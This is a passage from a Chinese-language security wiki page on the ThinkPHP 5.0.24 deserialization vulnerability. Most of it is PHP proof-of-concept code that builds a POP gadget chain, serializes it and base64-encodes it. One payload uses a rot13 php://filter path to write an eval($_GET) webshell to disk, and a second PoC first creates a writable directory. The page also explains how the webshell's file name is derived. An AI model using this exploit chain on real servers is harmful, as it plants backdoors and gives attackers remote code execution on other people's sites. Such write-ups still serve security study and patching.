<span class="w">        </span><span class="o">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">options</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">[</span>
<span class="w">        </span><span class="s1">&#39;expire&#39;</span><span class="w">        </span><span class="o">=&gt;</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span>
<span class="w">        </span><span class="s1">&#39;cache_subdir&#39;</span><span class="w">  </span><span class="o">=&gt;</span><span class="w"> </span><span class="bp">false</span><span class="p">,</span>
<span class="w">        </span><span class="s1">&#39;prefix&#39;</span><span class="w">        </span><span class="o">=&gt;</span><span class="w"> </span><span class="s1">&#39;&#39;</span><span class="p">,</span>
<span class="w">        </span><span class="s1">&#39;path&#39;</span><span class="w">          </span><span class="o">=&gt;</span><span class="w"> </span><span class="s1">&#39;php://filter/write=string.rot13/resource=./&lt;?cuc cucvasb();riny($_TRG[pzq]);?&gt;&#39;</span><span class="p">,</span>
<span class="w">        </span><span class="s1">&#39;data_compress&#39;</span><span class="w"> </span><span class="o">=&gt;</span><span class="w"> </span><span class="bp">false</span><span class="p">,</span>
<span class="w">        </span><span class="p">];</span>
<span class="w">        </span><span class="o">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">tag</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="bp">true</span><span class="p">;</span>
<span class="w">    </span><span class="p">}</span>
<span class="p">}</span>

<span class="n">namespace</span><span class="w"> </span><span class="n">think</span>\<span class="n">model</span><span class="p">;</span>
<span class="n">use</span><span class="w"> </span><span class="n">think</span>\<span class="n">Model</span><span class="p">;</span>
<span class="k">class</span><span class="w"> </span><span class="n">Pivot</span><span class="w"> </span><span class="k">extends</span><span class="w"> </span><span class="n">Model</span><span class="p">{</span>


<span class="p">}</span>
<span class="n">use</span><span class="w"> </span><span class="n">think</span>\<span class="n">process</span>\<span class="n">pipes</span>\<span class="n">Windows</span><span class="p">;</span>
<span class="n">echo</span><span class="w"> </span><span class="n">base64_encode</span><span class="p">(</span><span class="n">serialize</span><span class="p">(</span><span class="n">new</span><span class="w"> </span><span class="n">Windows</span><span class="p">()));</span>
</code></pre></div>

<p>该poc仅可在linux下使用，Windows对文件名有限制。</p>
<p>生成文件名规则：</p>
<div class="codehilite"><pre><span></span><code><span class="n">md5</span><span class="p">(</span><span class="s1">&#39;tag_&#39;</span><span class="p">.</span><span class="n">md5</span><span class="p">(</span><span class="err">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">tag</span><span class="p">))</span>
<span class="nl">即</span><span class="p">:</span>
<span class="n">md5</span><span class="p">(</span><span class="s1">&#39;tag_c4ca4238a0b923820dcc509a6f75849b&#39;</span><span class="p">)</span>
<span class="o">=&gt;</span><span class="mi">3</span><span class="n">b58a9545013e88c7186db11bb158c44</span>
<span class="o">=&gt;</span>
<span class="o">&lt;</span><span class="vm">?</span><span class="n">cuc</span><span class="w"> </span><span class="n">cucvasb</span><span class="p">();</span><span class="n">riny</span><span class="p">(</span><span class="err">$</span><span class="n">_TRG</span><span class="o">[</span><span class="n">pzq</span><span class="o">]</span><span class="p">);</span><span class="vm">?</span><span class="o">&gt;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mi">3</span><span class="n">b58a9545013e88c7186db11bb158c44</span>
<span class="n">最终文件名</span><span class="err">：</span>
<span class="o">&lt;</span><span class="vm">?</span><span class="n">cuc</span><span class="w"> </span><span class="n">cucvasb</span><span class="p">();</span><span class="n">riny</span><span class="p">(</span><span class="err">$</span><span class="n">_TRG</span><span class="o">[</span><span class="n">pzq</span><span class="o">]</span><span class="p">);</span><span class="vm">?</span><span class="o">&gt;</span><span class="mi">3</span><span class="n">b58a9545013e88c7186db11bb158c44</span><span class="p">.</span><span class="n">php</span>
</code></pre></div>

<p>在漏洞利用时需注意目录读写权限，可先控制options['path'] =
'./demo/'，利用框架创建一个755文件夹（前提是具有权限）</p>
<p>我们可以稍微修改下 <strong>payload</strong> 用于创建一个 <strong>0755</strong>
权限的目录（这里利用的是 <strong>think\cache\driver\File:getCacheKey()</strong>
中的 <strong>mkdir</strong> 函数），然后再往这个目录写文件。</p>
<p><img alt="" src="../resource/Thinkphp5.0.24%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/media/rId27.gif" /></p>
<h3 id="poc-demo">poc 创建demo目录<a class="headerlink" href="#poc-demo" title="Permanent link">&para;</a></h3>
<div class="codehilite"><pre><span></span><code><span class="o">&lt;</span><span class="err">?</span><span class="n">php</span>
<span class="n">namespace</span><span class="w"> </span><span class="n">think</span>\<span class="n">process</span>\<span class="n">pipes</span><span class="p">;</span>
<span class="n">use</span><span class="w"> </span><span class="n">think</span>\<span class="n">model</span>\<span class="n">Pivot</span><span class="p">;</span>
<span class="k">class</span><span class="w"> </span><span class="n">Pipes</span><span class="p">{</span>

<span class="p">}</span>

<span class="k">class</span><span class="w"> </span><span class="n">Windows</span><span class="w"> </span><span class="k">extends</span><span class="w"> </span><span class="n">Pipes</span><span class="p">{</span>
<span class="w">    </span><span class="n">private</span><span class="w"> </span><span class="o">$</span><span class="n">files</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">[];</span>

<span class="w">    </span><span class="n">function</span><span class="w"> </span><span class="n">__construct</span><span class="p">(){</span>
<span class="w">        </span><span class="o">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">files</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">[</span><span class="n">new</span><span class="w"> </span><span class="n">Pivot</span><span class="p">()];</span>
<span class="w">    </span><span class="p">}</span>
<span class="p">}</span>

<span class="n">namespace</span><span class="w"> </span><span class="n">think</span>\<span class="n">model</span><span class="p">;</span><span class="c1">#Relation</span>
<span class="n">use</span><span class="w"> </span><span class="n">think</span>\<span class="n">db</span>\<span class="n">Query</span><span class="p">;</span>
<span class="n">abstract</span><span class="w"> </span><span class="k">class</span><span class="w"> </span><span class="n">Relation</span><span class="p">{</span>
<span class="w">    </span><span class="n">protected</span><span class="w"> </span><span class="o">$</span><span class="n">selfRelation</span><span class="p">;</span>
<span class="w">    </span><span class="n">protected</span><span class="w"> </span><span class="o">$</span><span class="n">query</span><span class="p">;</span>
<span class="w">    </span><span class="n">function</span><span class="w"> </span><span class="n">__construct</span><span class="p">(){</span>
<span class="w">        </span><span class="o">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">selfRelation</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="bp">false</span><span class="p">;</span>
<span class="w">        </span><span class="o">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">query</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">new</span><span class="w"> </span><span class="n">Query</span><span class="p">();</span><span class="c1">#class Query</span>
<span class="w">    </span><span class="p">}</span>
<span class="p">}</span>

<span class="n">namespace</span><span class="w"> </span><span class="n">think</span>\<span class="n">model</span>\<span class="n">relation</span><span class="p">;</span><span class="c1">#OneToOne HasOne</span>
<span class="n">use</span><span class="w"> </span><span class="n">think</span>\<span class="n">model</span>\<span class="n">Relation</span><span class="p">;</span>
<span class="n">abstract</span><span class="w"> </span><span class="k">class</span><span class="w"> </span><span class="n">OneToOne</span><span class="w"> </span><span class="k">extends</span><span class="w"> </span><span class="n">Relation</span><span class="p">{</span>
<span class="w">    </span><span class="n">function</span><span class="w"> </span><span class="n">__construct</span><span class="p">(){</span>
<span class="w">        </span><span class="n">parent</span><span class="p">::</span><span class="n">__construct</span><span class="p">();</span>
<span class="w">    </span><span class="p">}</span>

<span class="p">}</span>
<span class="k">class</span><span class="w"> </span><span class="n">HasOne</span><span class="w"> </span><span class="k">extends</span><span class="w"> </span><span class="n">OneToOne</span><span class="p">{</span>
<span class="w">    </span><span class="n">protected</span><span class="w"> </span><span class="o">$</span><span class="n">bindAttr</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">[];</span>
<span class="w">    </span><span class="n">function</span><span class="w"> </span><span class="n">__construct</span><span class="p">(){</span>
<span class="w">        </span><span class="n">parent</span><span class="p">::</span><span class="n">__construct</span><span class="p">();</span>
<span class="w">        </span><span class="o">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">bindAttr</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">[</span><span class="s2">&quot;no&quot;</span><span class="p">,</span><span class="s2">&quot;123&quot;</span><span class="p">];</span>
<span class="w">    </span><span class="p">}</span>
<span class="p">}</span>

<span class="n">namespace</span><span class="w"> </span><span class="n">think</span>\<span class="n">console</span><span class="p">;</span><span class="c1">#Output</span>
<span class="n">use</span><span class="w"> </span><span class="n">think</span>\<span class="n">session</span>\<span class="n">driver</span>\<span class="n">Memcached</span><span class="p">;</span>
<span class="k">class</span><span class="w"> </span><span class="n">Output</span><span class="p">{</span>
<span class="w">    </span><span class="n">private</span><span class="w"> </span><span class="o">$</span><span class="n">handle</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb nb-Type">null</span><span class="p">;</span>
<span class="w">    </span><span class="n">protected</span><span class="w"> </span><span class="o">$</span><span class="n">styles</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">[];</span>
<span class="w">    </span><span class="n">function</span><span class="w"> </span><span class="n">__construct</span><span class="p">(){</span>
<span class="w">        </span><span class="o">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">handle</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">new</span><span class="w"> </span><span class="n">Memcached</span><span class="p">();</span><span class="o">//</span><span class="err">目的调用其</span><span class="n">write</span><span class="p">()</span>
<span class="w">        </span><span class="o">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">styles</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">[</span><span class="s1">&#39;getAttr&#39;</span><span class="p">];</span>
<span class="w">    </span><span class="p">}</span>
<span class="p">}</span>

<span class="n">namespace</span><span class="w"> </span><span class="n">think</span><span class="p">;</span><span class="c1">#Model</span>
<span class="n">use</span><span class="w"> </span><span class="n">think</span>\<span class="n">model</span>\<span class="n">relation</span>\<span class="n">HasOne</span><span class="p">;</span>
<span class="n">use</span><span class="w"> </span><span class="n">think</span>\<span class="n">console</span>\<span class="n">Output</span><span class="p">;</span>
<span class="n">use</span><span class="w"> </span><span class="n">think</span>\<span class="n">db</span>\<span class="n">Query</span><span class="p">;</span>
<span class="n">abstract</span><span class="w"> </span><span class="k">class</span><span class="w"> </span><span class="n">Model</span><span class="p">{</span>
<span class="w">    </span><span class="n">protected</span><span class="w"> </span><span class="o">$</span><span class="n">append</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">[];</span>
<span class="w">    </span><span class="n">protected</span><span class="w"> </span><span class="o">$</span><span class="n">error</span><span class="p">;</span>
<span class="w">    </span><span class="n">public</span><span class="w"> </span><span class="o">$</span><span class="n">parent</span><span class="p">;</span><span class="c1">#修改处</span>
<span class="w">    </span><span class="n">protected</span><span class="w"> </span><span class="o">$</span><span class="n">selfRelation</span><span class="p">;</span>
<span class="w">    </span><span class="n">protected</span><span class="w"> </span><span class="o">$</span><span class="n">query</span><span class="p">;</span>
<span class="w">    </span><span class="n">protected</span><span class="w"> </span><span class="o">$</span><span class="n">aaaaa</span><span class="p">;</span>

<span class="w">    </span><span class="n">function</span><span class="w"> </span><span class="n">__construct</span><span class="p">(){</span>
<span class="w">        </span><span class="o">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">parent</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">new</span><span class="w"> </span><span class="n">Output</span><span class="p">();</span><span class="c1">#Output对象,目的是调用__call()</span>
<span class="w">        </span><span class="o">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">append</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">[</span><span class="s1">&#39;getError&#39;</span><span class="p">];</span>
<span class="w">        </span><span class="o">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">error</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">new</span><span class="w"> </span><span class="n">HasOne</span><span class="p">();</span><span class="o">//</span><span class="n">Relation子类</span><span class="p">,</span><span class="err">且有</span><span class="n">getBindAttr</span><span class="p">()</span>
<span class="w">        </span><span class="o">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">selfRelation</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="bp">false</span><span class="p">;</span><span class="o">//</span><span class="n">isSelfRelation</span><span class="p">()</span>
<span class="w">        </span><span class="o">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">query</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">new</span><span class="w"> </span><span class="n">Query</span><span class="p">();</span>

<span class="w">    </span><span class="p">}</span>
<span class="p">}</span>

<span class="n">namespace</span><span class="w"> </span><span class="n">think</span>\<span class="n">db</span><span class="p">;</span><span class="c1">#Query</span>
<span class="n">use</span><span class="w"> </span><span class="n">think</span>\<span class="n">console</span>\<span class="n">Output</span><span class="p">;</span>
<span class="k">class</span><span class="w"> </span><span class="n">Query</span><span class="p">{</span>
<span class="w">    </span><span class="n">protected</span><span class="w"> </span><span class="o">$</span><span class="n">model</span><span class="p">;</span>
<span class="w">    </span><span class="n">function</span><span class="w"> </span><span class="n">__construct</span><span class="p">(){</span>
<span class="w">        </span><span class="o">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">model</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">new</span><span class="w"> </span><span class="n">Output</span><span class="p">();</span>
<span class="w">    </span><span class="p">}</span>
<span class="p">}</span>

<span class="n">namespace</span><span class="w"> </span><span class="n">think</span>\<span class="n">session</span>\<span class="n">driver</span><span class="p">;</span><span class="c1">#Memcached</span>
<span class="n">use</span><span class="w"> </span><span class="n">think</span>\<span class="n">cache</span>\<span class="n">driver</span>\<span class="n">File</span><span class="p">;</span>
<span class="k">class</span><span class="w"> </span><span class="n">Memcached</span><span class="p">{</span>
<span class="w">    </span><span class="n">protected</span><span class="w"> </span><span class="o">$</span><span class="n">handler</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb nb-Type">null</span><span class="p">;</span>
<span class="w">    </span><span class="n">function</span><span class="w"> </span><span class="n">__construct</span><span class="p">(){</span>
<span class="w">        </span><span class="o">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">handler</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">new</span><span class="w"> </span><span class="n">File</span><span class="p">();</span><span class="o">//</span><span class="err">目的调用</span><span class="n">File</span><span class="o">-&gt;</span><span class="n">set</span><span class="p">()</span>
<span class="w">    </span><span class="p">}</span>
<span class="p">}</span>
<span class="n">namespace</span><span class="w"> </span><span class="n">think</span>\<span class="n">cache</span>\<span class="n">driver</span><span class="p">;</span><span class="c1">#File</span>
<span class="k">class</span><span class="w"> </span><span class="n">File</span><span class="p">{</span>
<span class="w">    </span><span class="n">protected</span><span class="w"> </span><span class="o">$</span><span class="n">options</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">[];</span>
<span class="w">    </span><span class="n">protected</span><span class="w"> </span><span class="o">$</span><span class="n">tag</span><span class="p">;</span>
<span class="w">    </span><span class="n">function</span><span class="w"> </span><span class="n">__construct</span><span class="p">(){</span>
<span class="w">        </span><span class="o">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">options</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">[</span>
<span class="w">        </span><span class="s1">&#39;expire&#39;</span><span class="w">        </span><span class="o">=&gt;</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span>
<span class="w">        </span><span class="s1">&#39;cache_subdir&#39;</span><span class="w">  </span><span class="o">=&gt;</span><span class="w"> </span><span class="bp">false</span><span class="p">,</span>
<span class="w">        </span><span class="s1">&#39;prefix&#39;</span><span class="w">        </span><span class="o">=&gt;</span><span class="w"> </span><span class="s1">&#39;&#39;</span><span class="p">,</span>
<span class="w">        </span><span class="s1">&#39;path&#39;</span><span class="w">          </span><span class="o">=&gt;</span><span class="w"> </span><span class="s1">&#39;./demo/&#39;</span><span class="p">,</span>
<span class="w">        </span><span class="s1">&#39;data_compress&#39;</span><span class="w"> </span><span class="o">=&gt;</span><span class="w"> </span><span class="bp">false</span><span class="p">,</span>
<span class="w">        </span><span class="p">];</span>
<span class="w">        </span><span class="o">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">tag</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="bp">true</span><span class="p">;</span>
<span class="w">    </span><span class="p">}</span>
<span class="p">}</span>

<span class="n">namespace</span><span class="w"> </span><span class="n">think</span>\<span class="n">model</span><span class="p">;</span>
<span class="n">use</span><span class="w"> </span><span class="n">think</span>\<span class="n">Model</span><span class="p">;</span>
<span class="k">class</span><span class="w"> </span><span class="n">Pivot</span><span class="w"> </span><span class="k">extends</span><span class="w"> </span><span class="n">Model</span><span class="p">{</span>


<span class="p">}</span>
<span class="n">use</span><span class="w"> </span><span class="n">think</span>\<span class="n">process</span>\<span class="n">pipes</span>\<span class="n">Windows</span><span class="p">;</span>
<span class="n">echo</span><span class="w"> </span><span class="n">base64_encode</span><span class="p">(</span><span class="n">serialize</span><span class="p">(</span><span class="n">new</span><span class="w"> </span><span class="n">Windows</span><span class="p">()));</span>
</code></pre></div>

<p><img alt="" src="../resource/Thinkphp5.0.24%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/media/rId29.jpg" /></p>
<p><img alt="" src="../resource/Thinkphp5.0.24%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/media/rId30.jpg" /></p>
<h2 id="_5">参考链接<a class="headerlink" href="#_5" title="Permanent link">&para;</a></h2>
<blockquote>
<p><a href="http://althims.com/2020/02/07/thinkphp-5-0-24-unserialize/">http://althims.com/2020/02/07/thinkphp-5-0-24-unserialize/</a></p>
<p><a href="http://pines404.online/2020/01/20/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/ThinkPHP/ThinkPHP5.0.24%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE%E5%88%86%E6%9E%90/">http://pines404.online/2020/01/20/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/ThinkPHP/ThinkPHP5.0.24%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE%E5%88%86%E6%9E%90/</a></p>
<p><a href="https://xz.aliyun.com/t/7082">https://xz.aliyun.com/t/7082</a></p>
</blockquote>

  <br>
    

    
    
      
    

  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
    
    <div class="wm-article-nav pull-right">
      <a href="../Thinkphp%205.1.1%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96pop%E9%93%BE%E6%9E%84%E9%80%A0/" class="btn btn-xs btn-default pull-right">
        Next
        <i class="fa fa-chevron-right" aria-hidden="true"></i>
      </a>
      <a href="../Thinkphp%205.1.1%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96pop%E9%93%BE%E6%9E%84%E9%80%A0/" class="btn btn-xs btn-link">
        Thinkphp 5.1.1 反序列化pop链构造
      </a>
    </div>
    
    <div class="wm-article-nav">
      <a href="../../Thinkphp%206.x%20%E6%BC%8F%E6%B4%9E/Thinkphp%20_%206.0.2%20session%20id%E6%9C%AA%E4%BD%9C%E8%BF%87%E6%BB%A4%E5%AF%BC%E8%87%B4getshell/" class="btn btn-xs btn-default pull-left">
        <i class="fa fa-chevron-left" aria-hidden="true"></i>
        Previous</a><a href="../../Thinkphp%206.x%20%E6%BC%8F%E6%B4%9E/Thinkphp%20_%206.0.2%20session%20id%E6%9C%AA%E4%BD%9C%E8%BF%87%E6%BB%A4%E5%AF%BC%E8%87%B4getshell/" class="btn btn-xs btn-link">
        Thinkphp \&lt; 6.0.2 session id未作过滤导致getshell
      </a>
    </div>
    
  </div>

    <br>
</div>

<footer class="col-md-12 wm-page-content"><p>Copyright © 2025 SecNN-Wiki</p>
  <p>Documentation built with <a href="http://www.mkdocs.org/">MkDocs</a> using <a href="None">Windmill Dark</a> theme by 内部使用 (noraj).</p>
</footer>

</body>
</html>